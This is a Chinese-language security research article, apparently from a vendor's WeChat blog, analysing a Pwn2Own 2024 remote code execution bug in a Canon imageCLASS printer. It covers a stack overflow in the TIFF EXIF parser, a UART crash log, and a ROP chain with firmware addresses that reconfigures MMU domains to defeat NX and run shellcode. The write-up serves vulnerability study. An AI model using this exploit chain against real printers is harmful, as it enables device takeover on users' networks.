> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247512481&idx=1&sn=d403af9b610a2084cd79b961b4835b40

#  佳能imageCLASS打印机RCE漏洞分析  
原创 nil  山石网科安全技术研究院   2025-06-17 09:05  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**黑客如何在打印机上“大闹天宫”？Pwn2Own爱尔兰站2024佳能打印机漏洞利用全揭秘！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
2024年，Neodyme团队征战Pwn2Own爱尔兰站，再度聚焦“SOHO Smashup”这一极具挑战性的竞赛类别，延续2022年多伦多站的技术探索。在此次赛事中，该团队成功突破QNAP QHora-322路由器防线，并以此为跳板，横向渗透至佳能imageCLASS MF656Cdw打印机。本文将深入剖析打印机漏洞，从底层技术原理切入，完整呈现如何通过重新配置实时操作系统（RTOS）的内存管理单元（MMU），最终实现Shellcode执行的精彩过程。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、漏洞挖掘**  
  
****  
**（一）固件提取方法**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
在固件漏洞挖掘工作中，获取固件是首要环节。参考Synacktiv团队固件提取思路，该团队采用该品牌同系列打印机早期版本的固件提取流程，结合本次目标设备特性开展操作。在进一步挖掘中，该团队发现目标打印机通过UART接口开放了DryOS Shell。但与早期版本相比，该Shell的功能出现明显缩水，其中用于内存查看与修改的  
xd  
、  
xm  
指令已被移除。尽管固件底层仍保留相关操作基本指令，但缺失关键内存调试指令，使得在操作系统崩溃后，DryOS Shell难以获取寄存器值、MMU状态等核心系统信息，极大削弱了其在漏洞分析中的辅助作用。  
  
  
**（二）挖掘思路**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
该团队在参与Pwn2Own竞赛时面临着如下挑战:  
- 如何获取设备的网络访问权限？  
  
- 如何重启设备？  
  
- 如何从UART等硬件接口获取日志？  
  
- 如何实现中间人（MitM）并观察流量（如通过DNS劫持）？  
  
为应对这些难题，该团队将所有打印机和硬件设备运送至家庭网络中，并依托大型服务器机架搭建远程实验环境。通过VPN实现安全的远程访问，借助Home Assistant智能家居框架集成智能插座，实现设备的远程重启。同时，将不同UART接口接入服务器机架，配合  
screen  
工具，便于轻松实现硬件日志的远程抓取。在网络监测方面，通过划分VLAN隔离设备，并将所有流量实时传输至Wireshark套接字进行分析。此外，利用Technitium DNS服务器，可灵活进行DNS条目远程注册，实现高效的DNS劫持与流量监控。  
  
  
**（三）漏洞定位**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
在漏洞挖掘阶段，首先构建攻击面图谱，重点锁定两类目标：  
  
1.处理  
复杂二进制数据结构  
的解析器  
  
2.  
无需认证即可通过网络访问  
的组件（如打印作业服务）  
  
  
由于对佳能DryOS实时操作系统较为陌生，首先从系统架构入手，深入理解其上下文切换机制与任务调度逻辑。在此基础上，通过对DryOS二进制文件的全面逆向分析，最终定位到同时支持JPEG与TIFF格式的  
EXIF解析器  
。该解析器采用状态机模型实现EXIF数据解析，经分析发现该解析器在处理EXIF数据格式的过程中存在缓冲区溢出漏洞，具体数据处理流程如下图所示。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTJ9iauSbHfo1hEiaWNHKCarINCWP1DqZDlQjpuw4Fwjcl5ke7W84ZNubqTawj13lU8IcR0qVXpJ2RA/640?wx_fmt=png&from=appmsg "")  
  
  
**（四）EXIF文件**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
文件结构  
  
EXIF文件格式由文件头和IFD（图像文件目录）构成。其中IFD本质上是一个条目目录，包含条目数量及具体条目内容。每个条目包含标签（tag）、组件数量、单组件数据大小，以及值信息（若数据大小超过4字节，则存储为数据偏移量）,为了方便大家理解，这边用C代码描述该文件数据格式。  
  

```
// EXIF 文件由 TIFF 格式封装，核心结构包含头部和 IFD 目录
typedefstruct {
    uint16_t byte_order;       // 字节序（大端 II=0x4949，小端 MM=0x4D4D）
    uint16_t version;          // TIFF 版本（通常为 0x002A）
    uint32_t first_ifd_offset; // 第一个 IFD（图像文件目录）的偏移地址
} EXIF_FileHeader;

// IFD（图像文件目录）条目
typedefstruct {
    uint16_t tag;              // 标签（如 XResolution=0x011A，YResolution=0x011B）
    uint16_t type;             // 数据类型（如 5=无符号有理数 SRATIONAL）
    uint32_t count;            // 组件数量
    union {
        uint8_t  bytes[4];     // 若数据大小 ≤4 字节，直接存储值
        uint32_t offset;       // 若数据大小 >4 字节，存储数据偏移地址
    } value;
} EXIF_IFDEntry;

// IFD 目录
typedefstruct {
    uint32_t entry_count;      // 条目数量
    EXIF_IFDEntry entries[1];  // 可变长度条目数组（实际数量由 entry_count 决定）
    uint32_t next_ifd_offset;  // 下一个 IFD 的偏移地址（0 表示结束）
} EXIF_IFD;
```

  
  
解析过程  
  
EXIF解析器通过遍历IFD条目以提取打印所需信息（如图像宽高），其中宽高数据存储于XResolution（0x011a）、YResolution（0x011b）标签中。以下是佳能固件中IFD解析逻辑的关键流程-伪代码：  
  

```
nt __fastcall read_exif_table_buffer_overflow(tiff_parser *a1, int a2)
{
unsignedint *buf; // r1
unsignedint some_type; // r0
unsignedint num_components; // r6
int v7; // r8
bool v8; // zf
int table_size; // r7
  [...]
int32x4_t stack_value; // [sp+4h] [bp-74h] BYREF
unsignedint v25; // [sp+44h] [bp-34h]
unsignedint v26; // [sp+48h] [bp-30h]
int v27; // [sp+4Ch] [bp-2Ch]

memset(&stack_value, 0x40u);
  buf = (unsignedint *)a1->buf;
  some_type = *buf; // [1]
  num_components = buf[1]; // [2]
  current_tag = (unsigned __int16)*buf; // [3]
  v8 = current_tag == 0x102;                             // BitsPerSample
if ( current_tag != 0x102 )
    v8 = (unsigned __int16)some_type == 0x11A;           // XResolution
if ( !v8 && current_tag != 0x11B )                     // YResolution
  {
    if ( current_tag == 0x15B )                          // JPEGTables
    {
      v22 = analyse_status_to_string((unsigned __int8 *)off_40F928CC, (_DWORD *)analyse_status);
      exif_log(2630, 3, &#34;[Pipe][%s]: ERROR!Not Supported [JpegTable] line:%d\n&#34;, v22, 1258);
    }
    else
    {
      if ( current_tag != 0x190 )                        // GlobalParametersIFD
        return malloc_or_free((int)a1);
      v23 = analyse_status_to_string((unsigned __int8 *)off_40F928CC, (_DWORD *)analyse_status);
      exif_log(2630, 3, &#34;[Pipe][%s]: ERROR!Not Supported [GlobalParametersIFD] line:%d\n&#34;, v23, 1264);
    }
    a1->error_code = 3;
    return 5;
  }
  table_size = get_table_size(HIWORD(some_type)); // [4]
  v10 = exif_analyser_read((int)&stack_value, num_components * table_size, a1); // [5]

  // [...]
```

  
  
EXIF数据通过用户输入的二进制流（  
a1->buf  
）读取，其解析过程如下：  
  
1.  
字段提取  
：按规范依次读取数据类型（  
some_type  
）、组件数量（  
num_components  
）和标签（  
current_tag  
），对应代码注释中的  
[1]  
、  
[2]  
、  
[3]  
处。  
  
  
2.  
标签校验  
：程序检查标签是否为目标值（如  
XResolution  
），若不匹配则跳过处理。  
  
  
3.  
内存分配漏洞  
：  
- 在  
[4]  
处，通过  
get_table_size  
函数将数据类型转换为单组件字节数（例如，类型  
9  
对应  
LONG  
类型，占4字节）。  
  
- 该值与组件数量相乘，得到总数据长度，随后在  
[5]  
处将数据写入  
固定大小  
为0x40字节的栈缓冲区  
。  
  
- 关键缺陷  
：若攻击者构造异常数据类型或组件数量（如类型  
9  
搭配超大组件数量），计算出的总长度可能远超缓冲区容量，导致  
栈缓冲区溢出  
，覆盖返回地址或寄存器值。  
  
触发崩溃  
  
如何构造触发漏洞的TIFF格式EXIF文件？关键在于为XResolution标签指定非常规数据类型，并通过偏移量间接引用数据而非直接存储值。由于标准EXIF工具会过滤此类异常构造，我们只能借助十六进制编辑器手动编写文件结构。值得庆幸的是，exiftool内置的交互式可视化工具提供了清晰的标签映射界面，帮助精准定位字段偏移与二进制布局，通过填充大量重复的'a'字符用于填充溢出数据，具体操作如下图所示。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTJ9iauSbHfo1hEiaWNHKCarINmPnkXmJHUpibPPSwba0icLkDX3YZIXR3SK2DzajwAqRKdM829mD7yLg/640?wx_fmt=png&from=appmsg "")  
  
  
将构造好的TIFF文件作为打印作业发送至目标打印机后，最终通过UART接口捕获到操作系统崩溃日志。  
  

```
< Error Exception >
 CORE : 0       
 TYPE : prefetch
 ISR  : FALSE   
 TASK ID   : 155
 TASK Name : prd_mdprint
 R 0  : 00000005 
 R 1  : 4a915b4a 
 R 2  : 4a21cbfc 
 R 3  : 4a21cbfc 
 R 4  : 61616175 
 R 5  : 61616176 
 R 6  : 61616177 
 R 7  : 61616178 
 R 8  : 61616179 
 R 9  : 6261617a 
 R10  : 62616162 
 R11  : 62616163 
 R12  : 61706261 
 R13  : 4a21cbc8 
 R14  : 40f921e0 
 PC   : 62616164 
 PSR  : 20000013 
 CTRL : 00c5187d 
        IE(31)=0 
        TE(30)=0

```

  
  
该栈缓冲区溢出原语具备高度可控性：攻击者可精准界定越界覆盖的字节长度，除覆盖程序计数器（PC，值为  
0x62616164  
，对应十六进制字符串"baaa"）外，还能在寄存器从栈帧恢复阶段，将多数寄存器值篡改至攻击者可控状态。从攻击面差异分析，JPEG格式的EXIF解析器因可能经历过历史漏洞利用，其防御机制更完善；而TIFF格式的EXIF解析器没经过同样严格的安全测试，所以还存在上面说的栈溢出漏洞。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、漏洞利用**  
  
****  
  
DryOS作为一款轻量级实时操作系统（RTOS），未启用栈金丝雀（stack canaries）、地址空间布局随机化（ASLR）等安全防护机制。参考此前Pwn2Own竞赛中Synacktiv团队的公开方案，其利用栈溢出向静态内存写入Shellcode，并通过劫持执行流跳转至该地址（Shellcode通过BJNP SessionStart消息传递至打印机）。尽管内存地址和执行流指向正确，但操作系统跳转后崩溃。通过UART日志分析，确认佳能固件已引入  
NX（不可执行）保护  
，导致存储Shellcode的消息缓冲区内存区域被标记为不可执行，触发页面访问错误。由于打印机RTOS未实现权限分离，漏洞所在的解析模块以高权限运行。基于ARM架构特性，可通过修改内存管理单元（MMU）的  
域访问控制位  
为“管理模式”，绕过内存执行限制。具体方案为：构造  
ROP链  
激活管理模式，再跳转至消息缓冲区中的Shellcode。ROP链构造的核心是复用固件中现有的MMU配置函数，通过寻找特定gadget（如寄存器操作指令序列），利用ARM特权指令重新配置MMU域权限，使不可执行内存区域变为可执行。固件中存在的MMU配置函数为这一利用提供了关键支撑，如下代码所示。  
  

```
ROM:411AEDDC ; int __fastcall sub_411AEDDC(int)
ROM:411AEDDC sub_411AEDDC                            ; CODE XREF: ROM:40BB570C↑p
ROM:411AEDDC                                         ; ROM:40BB57A0↑p
ROM:411AEDDC                 LDR             R1, =0x55555555
ROM:411AEDE0                 MCR             p15, 0, R1,c3,c0, 0// [1] Jump here
ROM:411AEDE4                 LDR             R1, =0xFFFFC000
ROM:411AEDE8                 AND             R0, R0, R1
ROM:411AEDEC                 MOV             R1, #0
ROM:411AEDF0                 ORR             R0, R0, R1
ROM:411AEDF4                 MCR             p15, 0, R0,c2,c0, 0
ROM:411AEDF8                 MOV             R1, #0
ROM:411AEDFC                 MCR             p15, 0, R1,c8,c7, 0
ROM:411AEE00                 MRC             p15, 0, R1,c1,c0, 0
ROM:411AEE04                 ORR             R1, R1, #1
ROM:411AEE08                 DSB             SY
ROM:411AEE0C                 MCR             p15, 0, R1,c1,c0, 0
ROM:411AEE10                 ISB             SY
ROM:411AEE14                 BX              LR

```

  
  
利用方法:  
- 将所有域的访问权限设置为“客户端模式”  
  
- 设置转换表的基地址  
  
- 使转换后备缓冲器（TLB）失效  
  
- 在系统控制寄存器中启用内存管理单元（MMU）  
  
- 使用屏障指令（DSB/ISB）确保正确的内存和指令顺序  
  
从技术实现角度来看，此代码片段通过R0寄存器传递页表基址，完成了对ARM架构内存管理单元（MMU）的初始化配置。具体而言，其通过设置TTBR0（转换表基址寄存器0）建立虚拟地址到物理地址的映射关系，并将SCTLR（系统控制寄存器）的XN位（eXecute Never）置1以激活NX（不可执行）保护机制，从而确保数据段（如栈、堆）不会被误解析为可执行代码。  
  
  
在安全攻防层面，该团队采用了基于域访问控制机制的特权提升策略。通过构造精心设计的ROP（返回导向编程）链，利用内核空间中存在的可控内存操作原语，将DACR（域访问控制寄存器）的16个域访问权限位全部设置为0b11（对应0xffffffff），即Manager模式。这种配置会使MMU在进行地址转换时忽略页表条目中XN位的限制，从而允许在原本被标记为不可执行的内存区域执行恶意代码。  
  

```
# Static address of the BNJP message buffer. Search MFNP Cmd. There is a referece at beginning of function
BJNP_BUF = 0x47429460

# Offset into function, which sets the mode of the MMU
DISABLE_ACCESS_CHECKS = 0x411aede0

# Return gadget 
GADGET_RET = 0x40b03de0 + 1

# 0x00000000413dbcce : pop.w {r1, r2, r3, r4, r6, lr, pc} ;
GADGET_POP_LR = 0x413dbcce + 1

# : pop {r0, r1, pc}
POP_R0_R1_PC = 0x0000000040d74f10 + 1

rop_chain = b&#34;&#34;
rop_chain += p32(POP_R0_R1_PC)
rop_chain += p32(0x400fc000) # R0: Hardcoded value from the binary
rop_chain += p32(0xffffffff) # R1: Set manager bits
rop_chain += p32(GADGET_POP_LR) # PC: Next gadget
rop_chain += p32(0xffffffff) # R1: Set manager bits
rop_chain += p32(0x22222222) # R2
rop_chain += p32(0x33333333) # R3
rop_chain += p32(0x77777777) # R4
rop_chain += p32(0x88888888) # R6
rop_chain += p32(GADGET_RET) # LR: Executed at end of function
rop_chain += p32(DISABLE_ACCESS_CHECKS) # PC: Offset into our function setting the manager bits
rop_chain += p32(BJNP_BUF) # Last gadget: Return to shellcode

```

  
  
在上述exploit执行流程中，我们首先通过寄存器传递关键参数：将R0设为页表基址指针，R1设为域访问控制位（DACR），完成对MMU初始状态的配置。随后利用GADGET_POP_LR指令片段劫持控制流，将链接寄存器LR的值覆为RET地址，确保首个gadget函数执行完毕后跳转至预期位置。紧接着，程序跳转到B地址处执行MMU重配置代码，通过修改域访问权限（将所有域设为Manager模式）绕过NX保护。最终，通过RET指令跳转至JNP_BUF，将执行权移交至预加载在缓冲区中的shellcode，实现任意代码执行。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、总结**  
  
****  
  
在本文中，我们详细解析了如何在打印机系统中定位漏洞，并通过精心构造的攻击路径成功实现远程代码执行（RCE），同时绕过了佳能固件中近期新增的安全防护机制  
。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、相关链接**  
  
****  
  
https://neodyme.io/en/blog/pwn2own-2024_canon_rce/  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
